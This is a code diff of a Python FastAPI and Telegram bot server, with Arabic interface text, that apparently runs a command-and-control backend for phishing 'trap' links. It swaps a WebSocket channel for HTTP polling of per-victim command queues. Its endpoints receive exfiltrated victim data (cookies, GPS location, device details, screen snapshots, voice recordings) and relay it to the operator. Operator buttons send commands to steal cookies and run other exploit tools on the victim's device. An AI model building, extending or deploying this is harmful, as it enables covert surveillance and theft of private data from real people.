@@ -2,14 +2,14 @@ import os
 import uuid
 import asyncio
 import base64
-from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
-from fastapi.responses import HTMLResponse
+from fastapi import FastAPI, Request
+from fastapi.responses import HTMLResponse, JSONResponse
 from pydantic import BaseModel
 from aiogram import Bot, Dispatcher, types
 from aiogram.filters import Command
 from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
 
-from config import BOT_TOKEN, DOMAIN, LINK_TO_USER, VICTIMS_DB, ACTIVE_WEBSOCKETS
+from config import BOT_TOKEN, DOMAIN, LINK_TO_USER, VICTIMS_DB, COMMAND_QUEUES
 from templates import get_intel_template, get_live_template
 
 app = FastAPI()
@@ -37,41 +37,22 @@ async def serve_intel_trap(link_id: str):
 async def serve_live_trap(link_id: str):
     return HTMLResponse(content=get_live_template(link_id))
 
-@app.websocket("/ws/c2/{link_id}")
-async def websocket_endpoint(websocket: WebSocket, link_id: str):
-    await websocket.accept()
-    ACTIVE_WEBSOCKETS[link_id] = websocket
-    target_user_id = LINK_TO_USER.get(link_id)
-    
-    if target_user_id:
-        try:
-            await bot.send_message(chat_id=target_user_id, text=f"🟢 *[تنبيه C2: تم إنشاء قناة اتصال مستقرة مع الضحية]*\n🔑 المفتاح: `{link_id}`", parse_mode="Markdown")
-        except:
-            pass
+@app.get("/api/v1/poll-command/{link_id}")
+async def poll_command(link_id: str):
+    if link_id in COMMAND_QUEUES and COMMAND_QUEUES[link_id]:
+        cmd = COMMAND_QUEUES[link_id].pop(0)
+        return {"cmd": cmd}
+    return {"cmd": None}
 
-    try:
-        while True:
-            data = await websocket.receive_text()
-            import json
-            packet = json.loads(data)
-            if packet.get("type") == "response":
-                await handle_response_packet(packet)
-            await asyncio.sleep(2)
-            if link_id in ACTIVE_WEBSOCKETS:
-                await websocket.send_json({"cmd": "ping"})
-    except WebSocketDisconnect:
-        ACTIVE_WEBSOCKETS.pop(link_id, None)
-    except Exception:
-        ACTIVE_WEBSOCKETS.pop(link_id, None)
-
-async def handle_response_packet(packet: dict):
-    link_id = packet.get("link_id")
-    cmd_type = packet.get("cmd")
-    res_data = packet.get("data", "")
+@app.post("/api/v1/c2-respond")
+async def c2_respond(resp: CommandResponse):
+    link_id = resp.link_id
+    cmd_type = resp.cmd
+    res_data = resp.data
     target_user_id = LINK_TO_USER.get(link_id)
     
     if not target_user_id:
-        return
+        return {"status": "error"}
 
     try:
         if cmd_type == "screen_snapshot" and "," in str(res_data):
@@ -85,13 +66,10 @@ async def handle_response_packet(packet: dict):
             _, encoded = res_data.split(",", 1)
             await bot.send_voice(chat_id=target_user_id, voice=BufferedInputFile(base64.b64decode(encoded), filename="audio_rec.ogg"), caption="🎤 *ملف التسجيل الصوتي المسحوب*", parse_mode="Markdown")
         else:
-            await bot.send_message(chat_id=target_user_id, text=f"📥 *[نتيجة استغلال الأداة: {cmd_type}]*\n\n`{str(res_data)[:1200]}`", parse_mode="Markdown")
+            await bot.send_message(chat_id=target_user_id, text=f"📥 *[نتيجة تنفيذ الأداة: {cmd_type}]*\n\n`{str(res_data)[:1200]}`", parse_mode="Markdown")
     except Exception as e:
         print(f"Delivery Error: {e}")
-
-@app.post("/api/v1/c2-respond")
-async def c2_respond_fallback(resp: CommandResponse):
-    await handle_response_packet(resp.dict())
+        
     return {"status": "ok"}
 
 @app.post("/api/v1/exfiltrate")
@@ -110,13 +88,11 @@ async def receive_loot(data: VictimData):
             caption = (
                 "⚡ *[ اختراق ناجح واصطياد كامل للضحية! ]*\n\n"
                 f"💻 *النظام المتصفح:* `{data.device_info[:80]}`\n"
-                f"📐 *الشاشة الأساسية:* `{s_data.get('res', 'N/A')}` | 🎮 *معالج الرسوميات (GPU):* `{s_data.get('gpu', 'N/A')}`\n"
-                f"⚙️ *المنصة والأنوية:* `{s_data.get('platform', 'N/A')} | الأنوية: {s_data.get('hardwareConcurrency', 'N/A')}`\n"
+                f"📐 *الشاشة الأساسية:* `{s_data.get('res', 'N/A')}` | ⚙️ *المنصة:* `{s_data.get('platform', 'N/A')}`\n"
                 f"📍 *الموقع الجغرافي (GPS):* `{geo_text}`\n"
                 f"🍪 *الكوكيز:* `{data.stolen_cookies[:60]}...`"
             )
             
-            # لوحة تحكم عسكرية متكاملة بأدوات سيطرة تامة
             kb_control = InlineKeyboardMarkup(inline_keyboard=[
                 [
                     InlineKeyboardButton(text="🍪 سحب Cookies", callback_data=f"cmd_cookie_{data.link_id}"),
@@ -166,12 +142,11 @@ async def process_live_commands(callback: types.CallbackQuery):
         await callback.answer("❌ أمر استغلال غير معروف.", show_alert=True)
         return
 
-    ws = ACTIVE_WEBSOCKETS.get(link_id)
-    if ws:
-        await ws.send_json({"cmd": target_cmd})
-        await callback.answer("🚀 تم إرسال أمر الاستغلال للجهاز بنجاح!", show_alert=True)
-    else:
-        await callback.answer("⚠️ الجلسة غير متصلة حالياً بالـ WebSocket.", show_alert=True)
+    if link_id not in COMMAND_QUEUES:
+        COMMAND_QUEUES[link_id] = []
+    COMMAND_QUEUES[link_id].append(target_cmd)
+    
+    await callback.answer("🚀 تم إرسال الأمر بنجاح وجاري تنفيذه من جهاز الهدف!", show_alert=True)
 
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
@@ -184,7 +159,7 @@ async def cmd_start(message: types.Message):
     )
     await message.answer(
         "💀 *منصة الترسانة السيبرانية العسكرية المتقدمة*\n\n"
-        "• تم رفع كفاءة النظام بالكامل وتجاوز كافة القيود التقليدية.\n"
+        "• تم تفعيل نظام طوابير الأوامر المباشرة (HTTP Polling Engine).\n"
         "• اختر الأداة المطلوبة للبدء:",
         reply_markup=kb,
         parse_mode="Markdown"
@@ -209,8 +184,7 @@ async def show_stats(message: types.Message):
     user_id = message.from_user.id
     user_links = [t for t, uid in LINK_TO_USER.items() if uid == user_id]
     total_victims = sum(len(VICTIMS_DB.get(t, [])) for t in user_links)
-    active_sessions = sum(1 for t in user_links if t in ACTIVE_WEBSOCKETS)
-    await message.answer(f"📊 *إحصائيات ترسانتك:*\n\n🎯 إجمالي الضحايا: *{total_victims}*\n🟢 الجلسات النشطة حالياً: *{active_sessions}*", parse_mode="Markdown")
+    await message.answer(f"📊 *إحصائيات ترسانتك:*\n\n🎯 إجمالي الضحايا: *{total_victims}*", parse_mode="Markdown")
 
 async def run_polling():
     await dp.start_polling(bot)
